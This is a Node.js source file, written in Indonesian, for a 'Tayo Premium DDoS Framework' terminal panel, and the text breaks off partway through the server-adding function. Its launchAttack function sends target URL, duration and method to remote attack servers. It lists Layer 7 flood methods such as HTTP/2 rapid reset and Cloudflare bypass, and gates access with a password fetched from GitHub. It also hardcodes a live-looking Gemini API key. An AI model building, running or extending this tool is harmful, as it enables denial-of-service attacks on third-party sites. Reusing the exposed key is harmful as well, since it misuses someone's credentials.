
const GEMINI_API_KEY = 'AIzaSyBXCuOfj-ivUcq0ZFYW4do5bAmPuGFKaZo';

const { execSync } = require('child_process');
const requiredModules = [
    'axios', 'chalk', 'readline', 'figlet', 'gradient-string', 'cli-spinner', 'cli-table3', 'fs', 'https', 'open'
];
let Spinner;
try {
    Spinner = require('cli-spinner').Spinner;
} catch (e) {
    Spinner = null;
}
for (const mod of requiredModules) {
    try {
        require.resolve(mod);
     
        process.stdout.write(`\x1b[32m✓\x1b[0m Modul ${mod} sudah terinstall, skip...\n`);
    } catch (e) {
        const spinner = new Spinner({ text: `Menginstall modul: ${mod} ... %s`, stream: process.stdout });
        spinner.setSpinnerString('|/-\\');
        spinner.start();
        try {
            execSync(`npm install ${mod}`, { stdio: 'ignore' });
            spinner.stop(true);
            process.stdout.write(`\x1b[32m✓\x1b[0m Modul ${mod} berhasil diinstall!\n`);
        } catch (err) {
            spinner.stop(true);
            console.error(`Failed to install module: ${mod}`);
            process.exit(1);
        }
    }
}

const axios = require('axios');
const chalk = require('chalk');
const readline = require('readline');
const figlet = require('figlet');
const gradient = require('gradient-string');
const Table = require('cli-table3');
const fs = require('fs');
const https = require('https');
let open;
try {
    open = require('open');
} catch (e) {
    open = async (url) => {
        
        try { execSync(`xdg-open "${url}"`); } catch (e) { console.log('Buka manual:', url); }
    };
}


async function preCheck() {
        
        const { exec } = require('child_process');
        const readline = require('readline');

        const PW_URL  = "https://raw.githubusercontent.com/irfa12345678/tayo/refs/heads/main/pw.txt";
        const VER_URL = "https://raw.githubusercontent.com/irfa12345678/tayo/refs/heads/main/version.txt";
        const TEL_URL = "https://raw.githubusercontent.com/irfa12345678/tayo/refs/heads/main/tel.txt";
        const TI_URL  = "https://raw.githubusercontent.com/irfa12345678/tayo/refs/heads/main/ti.txt";
        const NAM_URL = "https://raw.githubusercontent.com/irfa12345678/tayo/refs/heads/main/nam.txt";

        const EXPECTED_VER = "2.2.2";
        const EXPECTED_NAM = "tayo x irfa X Shedow";

        // Polyfill fetch for Node.js if needed
        let fetchImpl = global.fetch;
        if (typeof fetchImpl !== 'function') {
                fetchImpl = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
        }

        async function fetchText(url) {
            const res = await fetchImpl(url);
            if (!res.ok) throw new Error(`Fetch gagal ${url}: ${res.status}`);
            return (await res.text()).trim();
        }

                function askPassword(prompt) {
                    return new Promise(resolve => {
                        const stdin = process.stdin;
                        const stdout = process.stdout;
                        
                        const banner = [
                            gradient.passion('╔════════════════════════════════════════════════════════╗'),
                            gradient.passion('║') + gradient.instagram('        PREMIUM LOGIN - TAYO PANEL         ') + gradient.passion('║'),
                            gradient.passion('╚════════════════════════════════════════════════════════╝'),
                            ''
                        ].join('\n');
                        console.log(banner);
                        
                        let spinnerFrames = [
                            gradient.passion('⠋'),
                            gradient.fruit('⠙'),
                            gradient.instagram('⠹'),
                            gradient.retro('⠸'),
                            gradient.vice('⠼'),
                            gradient.summer('⠴'),
                            gradient.cristal('⠦'),
                            gradient.pastel('⠧'),
                            gradient.teen('⠇'),
                            gradient.mind('⠏')
                        ];
                        let spinnerIndex = 0;
                        let spinnerInterval;
                        let active = true;
                   
                    const pwPrompt = gradient.instagram('Masukkan password: ');
                        function startSpinner() {
                            spinnerInterval = setInterval(() => {
                                if (!active) return;
                                stdout.write(`\r${pwPrompt}${spinnerFrames[spinnerIndex]} `);
                                spinnerIndex = (spinnerIndex + 1) % spinnerFrames.length;
                            }, 80);
                        }
                        function stopSpinner() {
                            active = false;
                            clearInterval(spinnerInterval);
                            stdout.write(`\r${pwPrompt}`);
                        }
                        startSpinner();
                        stdin.setRawMode(true);
                        let pwd = '';
                        stdin.on('data', ch => {
                            const s = ch.toString();
                            if (s === '\n' || s === '\r' || s === '\u0004') {
                                stopSpinner();
                                stdin.setRawMode(false);
                                stdout.write('\n');
                                resolve(pwd);
                            } else if (s === '\u0003') {
                                stopSpinner();
                                process.exit(1);
                            } else {
                                pwd += s;
                            }
                        });
                    });
                }

        async function tryOpen(url) {
            try {
                const openPkg = require('open');
                await openPkg(url);
                return true;
            } catch (_) {
                const plat = process.platform;
                const cmd = plat === 'win32' ? `start "" "${url}"` : plat === 'darwin' ? `open "${url}"` : `xdg-open "${url}"`;
                return new Promise(resolve => {
                    exec(cmd, (err) => resolve(!err));
                });
            }
        }

            try {
                const remoteVer = await fetchText(VER_URL);
                if (remoteVer !== EXPECTED_VER) {
                    console.error(`Versi tidak cocok: ${remoteVer}. Keluar.`);
                    return false;
                }

                const remoteNam = await fetchText(NAM_URL);
                if (remoteNam !== EXPECTED_NAM) {
                    console.error(`Nama tidak cocok: ${remoteNam}. Keluar.`);
                    return false;
                }

                const remotePw = await fetchText(PW_URL);
                const input = await askPassword("Masukkan password: ");

                const success = (input === remotePw);
                console.log(success ? "Password cocok ✅" : "Password salah ❌");
                if (!success) return false;

              
                let tel = "", ti = "";
                try { tel = await fetchText(TEL_URL); } catch (e) { /* ignore */ }
                try { ti  = await fetchText(TI_URL);  } catch (e) { /* ignore */ }

                const links = [tel, ti].filter(l => l && l.length);
                if (links.length === 0) {
                    console.log("Tidak ada link di tel.txt/ti.txt.");
                    
                    return true;
                }

                for (const l of links) {
                    console.log("Mencoba buka:", l);
                    const opened = await tryOpen(l);
                    if (!opened) console.log("Gagal buka otomatis — silakan buka manual:", l);
                }

                
                return true;
            } catch (err) {
                console.error("Error:", err.message);
                return false;
            }
}

(async () => {
    const ok = await preCheck();
    if (!ok) return;
  
    const terminal = new TayoDDoSTerminal();
    await terminal.showAsciiBanner();
    await terminal.showWelcomeMessage();
    terminal.showTerminalPrompt();
    // ...existing code...
})();
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: (text) => `\x1b[31m${text}\x1b[0m`,
    green: (text) => `\x1b[32m${text}\x1b[0m`,
    yellow: (text) => `\x1b[33m${text}\x1b[0m`,
    blue: (text) => `\x1b[34m${text}\x1b[0m`,
    magenta: (text) => `\x1b[35m${text}\x1b[0m`,
    cyan: (text) => `\x1b[36m${text}\x1b[0m`,
    white: (text) => `\x1b[37m${text}\x1b[0m`,
    gray: (text) => `\x1b[90m${text}\x1b[0m`,
    redBright: (text) => `\x1b[91m${text}\x1b[0m`,
    greenBright: (text) => `\x1b[92m${text}\x1b[0m`,
    yellowBright: (text) => `\x1b[93m${text}\x1b[0m`,
    blueBright: (text) => `\x1b[94m${text}\x1b[0m`,
    magentaBright: (text) => `\x1b[95m${text}\x1b[0m`,
    cyanBright: (text) => `\x1b[96m${text}\x1b[0m`,
    whiteBright: (text) => `\x1b[97m${text}\x1b[0m`,
    
    hex: (hex) => {
        
        switch(hex.toLowerCase()) {
            case '#ff4444': return colors.redBright;
            case '#44ff44': return colors.greenBright;
            case '#4444ff': return colors.blueBright;
            case '#ffff44': return colors.yellowBright;
            case '#44ffff': return colors.cyanBright;
            case '#ff44ff': return colors.magentaBright;
            case '#ffffff': return colors.whiteBright;
            default: return colors.white; // fallback
        }
    }
};

class TayoDDoSTerminal {

    async aiExplainTool() {
       
        const prompt = `Jelaskan secara singkat dan jelas tentang script Node.js ini:\n- Nama: Tayo Premium DDoS Framework\n- Fitur: Manajemen server, serangan DDoS Layer 7, UI premium, monitoring, dan menu bantuan.\n- Jelaskan fungsi dan keunggulan tools ini untuk user awam.`;
        try {
            const response = await axios.post(
                'https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=' + GEMINI_API_KEY,
                {
                    contents: [{ parts: [{ text: prompt }] }]
                },
                { headers: { 'Content-Type': 'application/json' } }
            );
            const aiText = response.data.candidates?.[0]?.content?.parts?.[0]?.text || 'AI tidak memberikan jawaban.';
            console.log(gradient.instagram('\n╔════════════════════════════════════════════════════════╗'));
            console.log(gradient.instagram('║           🤖 Penjelasan Tools oleh Gemini AI         ║'));
            console.log(gradient.instagram('╚════════════════════════════════════════════════════════╝'));
            console.log(colors.cyanBright(aiText));
        } catch (e) {
            console.log(colors.redBright('Gagal mengambil penjelasan dari Gemini AI!'));
        }
    }
    async showHelp() {
        const tayoBanner = [
            gradient.passion('╔════════════════════════════════════════════════════════╗'),
            gradient.passion('║   ') + gradient.instagram('DAFTAR PERINTAH UTAMA - TAYO PANEL') + gradient.passion('   ║'),
            gradient.passion('╚════════════════════════════════════════════════════════╝'),
            ''
        ].join('\n');

        const helpTable = new Table({
            head: [
                colors.yellowBright('COMMAND'),
                colors.yellowBright('DESCRIPTION'),
                colors.yellowBright('ALIASES'),
                colors.yellowBright('ICON')
            ],
            colWidths: [15, 35, 15, 8],
            chars: {
                'top': '═', 'top-mid': '╦', 'top-left': '╔', 'top-right': '╗',
                'bottom': '═', 'bottom-mid': '╩', 'bottom-left': '╚', 'bottom-right': '╝',
                'left': '║', 'left-mid': '╠', 'mid': '═', 'mid-mid': '╬',
                'right': '║', 'right-mid': '╣', 'middle': '║'
            }
        });

        helpTable.push(
            [colors.greenBright('attack'), colors.white('Start a new attack'), colors.cyan('ddos, fire'), '💥'],
            [colors.greenBright('methods'), colors.white('List available methods'), colors.cyan('list'), '📜'],
            [colors.greenBright('servers'), colors.white('List configured servers'), colors.cyan('lsservers'), '🌐'],
            [colors.greenBright('addserver'), colors.white('Add a new server'), colors.cyan('add'), '➕'],
            [colors.greenBright('switch'), colors.white('Switch active server'), colors.cyan('change'), '🔄'],
            [colors.greenBright('history'), colors.white('Show attack history'), colors.cyan('logs'), '📚'],
            [colors.greenBright('status'), colors.white('Check server status'), colors.cyan('stats'), '📊'],
            [colors.greenBright('health'), colors.white('Check server health'), colors.cyan('check'), '❤️'],
            [colors.greenBright('info'), colors.white('Show server information'), colors.cyan('sinfo'), '🔍'],
            [colors.greenBright('ai'), colors.white('Penjelasan tools oleh AI'), colors.cyan(''), '🤖'],
            [colors.greenBright('clear'), colors.white('Clear terminal screen'), colors.cyan('cls'), '🧹'],
            [colors.greenBright('help'), colors.white('Show this help message'), colors.cyan('?'), '❓'],
            [colors.greenBright('tutorial'), colors.white('Step-by-step usage guide'), colors.cyan(''), '📖'],
            [colors.greenBright('tayo'), colors.white('Script explanation menu'), colors.cyan(''), '📝'],
            [colors.greenBright('exit'), colors.white('Exit the terminal'), colors.cyan('quit'), '🚪']
        );

        console.log(tayoBanner);
        console.log(helpTable.toString());
        console.log(gradient.passion('\nType ') + colors.yellowBright('attack <url> <time> <method>') + gradient.passion(' to start! | ') + colors.cyanBright('Follow @Irfaty for updates.'));
        console.log(gradient.atlas('╔══════════════════════════════════════════════════════════╗'));
        console.log(gradient.atlas('║   Enjoy the premium UI! Use responsibly.                ║'));
        console.log(gradient.atlas('╚══════════════════════════════════════════════════════════╝'));
    }
    async showWelcomeMessage() {
        const welcome = [
            gradient.instagram('╔════════════════════════════════════════════════════════════════╗'),
            gradient.instagram('║') + gradient.passion('   Selamat datang di Tayo Premium DDoS Control Panel!   ') + gradient.instagram('║'),
            gradient.instagram('║') + gradient.teen('   Tools Layer 7 VIP, UI modern, fitur lengkap!         ') + gradient.instagram('║'),
            gradient.instagram('║') + gradient.atlas('   Powered by Tayo | Follow @Irfaty for update tools   ') + gradient.instagram('║'),
            gradient.instagram('╚════════════════════════════════════════════════════════════════╝'),
            ''
        ].join('\n');
        console.log(welcome);
        await new Promise(resolve => setTimeout(resolve, 800));
    }
    constructor() {
        this.baseUrl = 'http://192.168.100.50:5032';
        this.servers = [
            { 
                name: '🟢 MAIN SERVER', 
                url: 'http://192.168.100.50:5032',
                status: 'online',
                method: '/tayo',
                active: true
            }
        ];
        this.currentServer = 0;
        this.attackHistory = [];
        this.methodsList = [];
        this.username = 'root';
        this.hostname = 'tayo-ddos';
        this.currentDir = '~/servers';
        // Removed persistent readline interface; will use local rl for each prompt
    }

    async showAsciiBanner() {
        return new Promise((resolve) => {
            const banner = [
                gradient.cristal('╔════════════════════════════════════════════════════════════════╗'),
                gradient.cristal('║') + gradient.passion('      ████████╗ █████╗ ██╗   ██╗ ██████╗ ') + gradient.cristal('        ║'),
                gradient.cristal('║') + gradient.passion('      ╚══██╔══╝██╔══██╗██║   ██║██╔═══██╗') + gradient.cristal('        ║'),
                gradient.cristal('║') + gradient.passion('         ██║   ███████║██║   ██║██║   ██║') + gradient.cristal('        ║'),
                gradient.cristal('║') + gradient.passion('         ██║   ██╔══██║╚██╗ ██╔╝██║   ██║') + gradient.cristal('        ║'),
                gradient.cristal('║') + gradient.passion('         ██║   ██║  ██║ ╚████╔╝ ╚██████╔╝') + gradient.cristal('        ║'),
                gradient.cristal('║') + gradient.passion('         ╚═╝   ╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ') + gradient.cristal('        ║'),
                gradient.cristal('║                                                              ║'),
                gradient.cristal('║') + gradient.atlas('           🚀 Premium DDoS Framework v7.0 🚀') + gradient.cristal('           ║'),
                gradient.cristal('║') + gradient.teen('              [ VIP Edition 2025 ]') + gradient.cristal('                     ║'),
                gradient.cristal('║                                                              ║'),
                gradient.cristal('║') + gradient.passion('    ⚡ Features:') + gradient.cristal('                                          ║'),
                gradient.cristal('║') + gradient.atlas('    ✓ Multi-Method Layer 7 Attacks') + gradient.cristal('                        ║'),
                gradient.cristal('║') + gradient.atlas('    ✓ Advanced Server Management') + gradient.cristal('                          ║'),
                gradient.cristal('║') + gradient.atlas('    ✓ Real-time Attack Monitoring') + gradient.cristal('                        ║'),
                gradient.cristal('║') + gradient.atlas('    ✓ Premium UI/UX Interface') + gradient.cristal('                           ║'),
                gradient.cristal('╚════════════════════════════════════════════════════════════════╝'),
                '',
                gradient.passion('     🌐 System   : ') + colors.white('Premium Layer 7'),
                gradient.passion('     🛡️ Security : ') + colors.greenBright('Protected'),
                gradient.passion('     👤 License  : ') + colors.yellowBright('VIP'),
                gradient.passion('     ⚡ Status   : ') + colors.greenBright('READY'),
                ''
            ].join('\n');
            console.log(banner);
            resolve();
        });
    }

    async loadMethods() {
        // Tayo ASCII Art for method section
        const tayoArt = [
            gradient.passion('      ████████╗ █████╗ ██╗   ██╗ ██████╗'),
            gradient.passion('      ╚══██╔══╝██╔══██╗██║   ██║██╔═══██╗'),
            gradient.passion('         ██║   ███████║██║   ██║██║   ██║'),
            gradient.passion('         ██║   ██╔══██║╚██╗ ██╔╝██║   ██║'),
            gradient.passion('         ██║   ██║  ██║ ╚████╔╝ ╚██████╔╝'),
            gradient.passion('         ╚═╝   ╚═╝  ╚═╝  ╚═══╝   ╚═════╝ '),
            gradient.atlas('        ╔═════════════════════════════════╗'),
            gradient.atlas('        ║   TAYO - VIP METHOD LIST 2025  ║'),
            gradient.atlas('        ║   Powered by Tayo              ║'),
            gradient.atlas('        ╚═════════════════════════════════╝'),
            ''
        ].join('\n');
        console.log(tayoArt);
        this.methodsList = [
            { name: 'hold', description: 'Basic Hold Attack', power: '★★★☆☆' },
            { name: 'glory', description: 'Glory Attack Method', power: '★★★★☆' },
            { name: 'bypass', description: 'Bypass Protection', power: '★★★★★' },
            { name: 'https', description: 'HTTPS Flood', power: '★★★☆☆' },
            { name: 'flood', description: 'VIP Flood', power: '★★★★☆' },
            { name: 'mix', description: 'Mixed Billing Attack', power: '★★★★☆' },
            { name: 'h2', description: 'HTTP/2 Flash Attack', power: '★★★★★' },
            { name: 'rapid-reset', description: 'Rapid Reset Attack', power: '★★★★★' },
            { name: 'sch', description: 'SCH Method', power: '★★★☆☆' },
            { name: 'overload', description: 'Overload Target', power: '★★★★☆' },
            { name: 'ssh', description: 'SSH Attack', power: '★★★☆☆' },
            { name: 'proxy', description: 'Proxy Scraping', power: '★★☆☆☆' },
            { name: 'panel', description: 'Panel Attack', power: '★★★★☆' },
            { name: 'strike', description: 'Strike Method', power: '★★★☆☆' },
            { name: 'bh', description: 'Behind Cloudflare', power: '★★★★★' }
        ];
    }

    showTerminalPrompt() {
    const activeServers = this.servers.filter(server => server.active).length;
    const totalServers = this.servers.length;
    const prompt = `\n${colors.cyan('╭─[')}${colors.blueBright(`${this.username}@${this.hostname}`)}${colors.cyan(']─[')}${colors.yellow(`${this.currentDir} (${activeServers}/${totalServers})`)}${colors.cyan(']')}
${colors.cyan('╰─❯')} ${colors.blueBright('›')} `;
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(prompt, async (line) => {
        rl.close();
        await this.processCommand(line);
    });
    }

    async processCommand(line) {
        const parts = line.trim().split(' ');
        const cmd = parts[0].toLowerCase();
        const args = parts.slice(1);

        switch(cmd) {
            case 'help':
            case '?':
                await this.showHelp();
                break;

            case 'tayo':
                await this.showTayoMenu();
                break;

            case 'ai':
                await this.aiExplainTool();
                break;
            case 'tutorial':
                // await this.showTutorial(); // Assuming this function exists or will be added
                console.log(colors.yellowBright('Tutorial coming soon!'));
                break;

            case 'attack':
            case 'ddos':
            case 'fire':
                await this.launchAttack(args);
                break;

            case 'methods':
            case 'lsmethods':
            case 'list':
                await this.showMethods();
                break;

            case 'servers':
            case 'lsservers':
                await this.listServers();
                break;

            case 'addserver':
            case 'add':
                await this.addServer(args);
                break;

            case 'switch':
            case 'change':
                await this.switchServer(args);
                break;

            case 'history':
            case 'logs':
                await this.showAttackHistory();
                break;

            case 'status':
            case 'stats':
                await this.serverStatus();
                break;

            case 'health':
            case 'check':
                await this.healthCheck();
                break;

            case 'info':
            case 'sinfo':
                await this.serverInfo();
                break;

            case 'clear':
            case 'cls':
                console.clear();
                await this.showAsciiBanner();
                break;

            case 'exit':
            case 'quit':
                this.exitTool();
                return;

            case '':
                break;

            case 'onsit':
                if (args[0]) {
                    await this.onsitMenu(args[0]);
                } else {
                    console.log('Usage: onsit <domain>');
                }
                break;

            default:
                console.log(colors.redBright(`❌ Command not found: ${cmd}`));
                console.log(colors.yellowBright('💡 Type "help" for available commands'));
                break;
        }

        this.showTerminalPrompt();
    }

    async showTayoMenu() {
        // Tayo Detailed Explanation Banner
        const banner = [
            gradient.cristal('╔════════════════════════════════════════════════════════════════╗'),
            gradient.cristal('║') + gradient.passion('      ████████╗ █████╗ ██╗   ██╗ ██████╗ ') + gradient.cristal('        ║'),
            gradient.cristal('║') + gradient.passion('      ╚══██╔══╝██╔══██╗██║   ██║██╔═══██╗') + gradient.cristal('        ║'),
            gradient.cristal('║') + gradient.passion('         ██║   ███████║██║   ██║██║   ██║') + gradient.cristal('        ║'),
            gradient.cristal('║') + gradient.passion('         ██║   ██╔══██║╚██╗ ██╔╝██║   ██║') + gradient.cristal('        ║'),
            gradient.cristal('║') + gradient.passion('         ██║   ██║  ██║ ╚████╔╝ ╚██████╔╝') + gradient.cristal('        ║'),
            gradient.cristal('║') + gradient.passion('         ╚═╝   ╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ') + gradient.cristal('        ║'),
            gradient.cristal('║                                                              ║'),
            gradient.cristal('║') + gradient.atlas('           🚀 TAYO - SCRIPT EXPLANATION MENU 🚀') + gradient.cristal('   ║'),
            gradient.cristal('║') + gradient.teen('              [ VIP Edition 2025 ]') + gradient.cristal('           ║'),
            gradient.cristal('╚════════════════════════════════════════════════════════════════╝'),
            ''
        ].join('\n');
        console.log(banner);

        // Detailed explanation
        const details = [
            colors.yellowBright('1. Tujuan Script:'),
            colors.white('   - Framework premium untuk mengelola dan menjalankan serangan DDoS Layer 7 dengan UI modern dan branding Tayo.'),
            '',
            colors.yellowBright('2. Struktur & Arsitektur:'),
            colors.white('   - Berbasis Node.js, menggunakan chalk, gradient-string, cli-table3, cli-spinner, dan axios.'),
            colors.white('   - Semua fitur dikemas dalam class TayoDDoSTerminal.'),
            '',
            colors.yellowBright('3. Fitur Utama:'),
            colors.white('   - Manajemen server (addserver, switch, list).'),
            colors.white('   - 15+ metode serangan Layer 7 (methods, attack).'),
            colors.white('   - Monitoring riwayat serangan (history).'),
            colors.white('   - Status & kesehatan server (status, health, info).'),
            colors.white('   - UI premium: ASCII art, gradient, tabel modern, ikon, branding Tayo.'),
            colors.white('   - Menu bantuan (help) dan tutorial (tutorial) untuk user guidance.'),
            '',
            colors.yellowBright('4. Cara Kerja:'),
            colors.white('   - Setiap perintah diproses melalui terminal dengan switch-case modular.'),
            colors.white('   - Serangan dijalankan ke server aktif dengan API endpoint yang dikonfigurasi.'),
            colors.white('   - Hasil serangan dan status server ditampilkan secara real-time dengan spinner dan tabel.'),
            '',
            colors.yellowBright('5. Branding & Premium UI:'),
            colors.white('   - Semua menu dan banner menggunakan ASCII art dan gradient warna.'),
            colors.white('   - Credit "Powered by Tayo" di setiap banner.'),
            colors.white('   - Ikon dan warna untuk membedakan status, metode, dan hasil.'),
            '',
            colors.yellowBright('6. Tips Penggunaan:'),
            colors.white('   - Gunakan "help" untuk melihat semua perintah.'),
            colors.white('   - Gunakan "tutorial" untuk panduan langkah demi langkah.'),
            colors.white('   - Gunakan "tayo" untuk penjelasan script secara rinci.'),
            '',
            colors.yellowBright('7. Catatan Etika:'),
            colors.white('   - Gunakan tools ini secara bertanggung jawab dan etis.'),
            colors.white('   - Segala tindakan adalah tanggung jawab pengguna.'),
            '',
            colors.yellowBright('8. Credit & Update:'),
            colors.white('   - Powered by Tayo | Follow @Irfaty untuk update tools premium.'),
        ];
        details.forEach(line => console.log(line));

        // Footer
        console.log(gradient.atlas('\n╔════════════════════════════════════════════════════════════════╗'));
        console.log(gradient.atlas('║   TAYO - Premium DDoS Framework | VIP Edition 2025          ║'));
        console.log(gradient.atlas('║   Powered by Tayo | Follow @Irfaty for updates              ║'));
        console.log(gradient.atlas('╚════════════════════════════════════════════════════════════════╝'));
    }

    async launchAttack(args) {
        if (args.length < 3) {
            console.log(colors.redBright('❌ Usage: attack <url> <time> <method>'));
            console.log(colors.yellowBright('💡 Example: attack http://example.com 60 hold'));
            console.log(colors.greenBright('🔍 Run "methods" to see available methods'));
            return;
        }

        const [target, time, method] = args;

        const activeServers = this.servers.filter(server => server.active);
        if (activeServers.length === 0) {
            console.log(colors.redBright('❌ No active servers! Use "switch" to activate a server first.'));
            return;
        }

        const attackPromises = activeServers.map(server => {
            const url = `${server.url}${server.method}?target=${encodeURIComponent(target)}&time=${time}&method=${method}`;
            return axios.get(url, { timeout: 10000 }) // 10 second timeout
                .then(response => ({ server: server.name, success: true, data: response.data }))
                .catch(error => ({ server: server.name, success: false, error: error.message }));
        });

        const spinner = new Spinner(colors.greenBright(`🚀 Launching attack on ${activeServers.length} server(s)... %s`));
        spinner.setSpinnerString('⣾⣽⣻⢿⡿⣟⣯⣷');
        spinner.start();

        try {
            const results = await Promise.all(attackPromises);
            spinner.stop(true);

            const tayoAttackBanner = [
                gradient.passion('╔══════════════════════════════════════════════════════════╗'),
                gradient.passion('║') + ' '.repeat(10) + colors.yellowBright('💥 ATTACK LAUNCHED 💥') + ' '.repeat(28) + gradient.passion('║'),
                gradient.passion('╚══════════════════════════════════════════════════════════╝'),
                ''
            ].join('\n');
            console.log(tayoAttackBanner);


            const table = new Table({
                head: [colors.yellowBright('SERVER'), colors.yellowBright('STATUS'), colors.yellowBright('RESPONSE')],
                colWidths: [20, 15, 40],
                 chars: {
                    'top': '═', 'top-mid': '╦', 'top-left': '╔', 'top-right': '╗',
                    'bottom': '═', 'bottom-mid': '╩', 'bottom-left': '╚', 'bottom-right': '╝',
                    'left': '║', 'left-mid': '╠', 'mid': '═', 'mid-mid': '╬',
                    'right': '║', 'right-mid': '╣', 'middle': '║'
                }
            });

            results.forEach(result => {
                if (result.success) {
                    table.push([colors.cyan(result.server), colors.greenBright('✅ SUCCESS'), colors.white(JSON.stringify(result.data))]);
                } else {
                    table.push([colors.cyan(result.server), colors.redBright('❌ FAILED'), colors.red(result.error)]);
                }
            });

            console.log(table.toString());

            this.attackHistory.push({
                timestamp: new Date().toLocaleString(),
                target,
                method,
                duration: time,
                server: activeServers.map(s => s.name).join(', '),
                status: results.some(r => r.success) ? 'SUCCESS' : 'FAILED'
            });

        } catch (error) {
            spinner.stop(true);
            console.log(colors.redBright('❌ An unexpected error occurred during the attack:'), error.message);
        }
    }

    async showMethods() {
        // Gradient ASCII art title
        const title = [
            gradient.passion('╔══════════════════════════════════════════════════════════╗'),
            gradient.passion('║   🚀  TAYO PREMIUM METHODS - VIP EDITION 2025  🚀      ║'),
            gradient.passion('╚══════════════════════════════════════════════════════════╝'),
            ''
        ].join('\n');
        console.log(title);

        // Table with icons and colors
        const table = new Table({
            head: [
                colors.yellowBright('METHOD'),
                colors.yellowBright('DESCRIPTION'),
                colors.yellowBright('POWER'),
                colors.yellowBright('ICON')
            ],
            colWidths: [15, 35, 10, 8],
            chars: {
                'top': gradient.passion('═'), 'top-mid': gradient.passion('╦'), 'top-left': gradient.passion('╔'), 'top-right': gradient.passion('╗'),
                'bottom': gradient.passion('═'), 'bottom-mid': gradient.passion('╩'), 'bottom-left': gradient.passion('╚'), 'bottom-right': gradient.passion('╝'),
                'left': gradient.passion('║'), 'left-mid': gradient.passion('╠'), 'mid': gradient.passion('═'), 'mid-mid': gradient.passion('╬'),
                'right': gradient.passion('║'), 'right-mid': gradient.passion('╣'), 'middle': gradient.passion('║')
            }
        });

        // Method icons
        const methodIcons = {
            hold: '🛡️', glory: '⚡', bypass: '🚀', https: '🔒', flood: '🌊', mix: '🎲', h2: '💨', 'rapid-reset': '⏩', sch: '🔁', overload: '🔥', ssh: '🔑', proxy: '🌐', panel: '🖥️', strike: '🎯', bh: '☁️'
        };

        this.methodsList.forEach(method => {
            table.push([
                colors.cyanBright(method.name),
                colors.white(method.description),
                colors.redBright(method.power),
                methodIcons[method.name] || '✨'
            ]);
        });

        console.log(table.toString());
        // Summary and tip
        console.log(gradient.passion(`\nTotal Methods: ${this.methodsList.length}  |  Type 'attack <url> <time> <method>' to start!`));
        console.log(gradient.atlas('╔══════════════════════════════════════════════════════════╗'));
        console.log(gradient.atlas('║   Enjoy the premium UI! Follow @Irfaty for updates.     ║'));
        console.log(gradient.atlas('╚══════════════════════════════════════════════════════════╝'));
    }

    async listServers() {
        console.log(colors.redBright('╔══════════════════════════════════════════════════════════╗'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('🌐 CONFIGURED SERVERS') + '                           ' + colors.redBright('║'));
        console.log(colors.redBright('╠══════════════════════════════════════════════════════════╣'));

        if (this.servers.length === 0) {
            console.log(colors.redBright('║') + ' ' + colors.yellowBright('No servers configured.') + '                      ' + colors.redBright('║'));
            console.log(colors.redBright('║') + ' ' + colors.white('Use "addserver [url]" to add a new server.') + '  ' + colors.redBright('║'));
        } else {
            const table = new Table({
                head: [
                    colors.yellowBright('#'),
                    colors.yellowBright('STATUS'),
                    colors.yellowBright('ACTIVE'),
                    colors.yellowBright('NAME'),
                    colors.yellowBright('URL'),
                    colors.yellowBright('API')
                ],
                colWidths: [3, 8, 8, 18, 25, 10],
                chars: {
                    'top': '═', 'top-mid': '╦', 'top-left': '╔', 'top-right': '╗',
                    'bottom': '═', 'bottom-mid': '╩', 'bottom-left': '╚', 'bottom-right': '╝',
                    'left': '║', 'left-mid': '╠', 'mid': '═', 'mid-mid': '╬',
                    'right': '║', 'right-mid': '╣', 'middle': '║'
                }
            });

            this.servers.forEach((server, index) => {
                const status = server.status === 'online' ? colors.greenBright('🟢') : colors.redBright('🔴');
                const active = server.active ? colors.greenBright('✅') : colors.redBright('❌');
                const name = server.active ? colors.yellowBright(server.name) : colors.white(server.name);
                
                table.push([
                    colors.cyan(index + 1),
                    status,
                    active,
                    name,
                    colors.cyan(server.url),
                    colors.greenBright(server.method)
                ]);
            });

            console.log(table.toString());
        }
        
        console.log(colors.redBright('╠══════════════════════════════════════════════════════════╣'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('💡 TIPS:') + ' ' + colors.white('addserver [url] [api_endpoint]') + '        ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('     ') + ' ' + colors.white('switch <number|all>') + '                    ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('     ') + ' ' + colors.white('switch 1 (activate server 1)') + '           ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('     ') + ' ' + colors.white('switch all (activate all servers)') + '      ' + colors.redBright('║'));
        console.log(colors.redBright('╚══════════════════════════════════════════════════════════╝'));
    }

    async addServer(args) {
        if (args.length < 1) {
            console.log(colors.redBright('❌ Usage: addserver [url] [api_endpoint]'));
            console.log(colors.yellowBright('💡 Example: addserver http://192.168.1.100:5032 /api'));
            console.log(colors.greenBright('🔗 API endpoint defaults to /tayo if not specified'));
            return;
        }

        const url = args[0];
        const method = args[1] || '/tayo'; // Default to /tayo if not specified

        // Validate URL format
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            console.log(colors.redBright('❌ Invalid URL format. Must start with http:// or https://'));
            return;
        }

        // Check if server already exists
        const existingServer = this.servers.find(server => server.url === url);
        if (existingServer) {
            console.log(colors.redBright('❌ Server with this URL already exists!'));
            return;
        }

        // Generate auto name based on URL
        const serverName = this.generateServerName(url);
        
        const newServer = {
            name: `🟢 ${serverName}`,
            url: url,
            status: 'online',
            method: method,
            active: false // New servers are inactive by default
        };

        this.servers.push(newServer);
        
        console.log(colors.redBright('╔══════════════════════════════════════════════════════════╗'));
        console.log(colors.redBright('║') + ' ' + colors.greenBright('✅ SERVER ADDED SUCCESSFULLY!') + '                  ' + colors.redBright('║'));
        console.log(colors.redBright('╠══════════════════════════════════════════════════════════╣'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('🏷️  Name:') + ' ' + colors.white(serverName) + '                          ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('🌐 URL:') + ' ' + colors.cyan(url) + '                      ' + colors.redBright('║'));
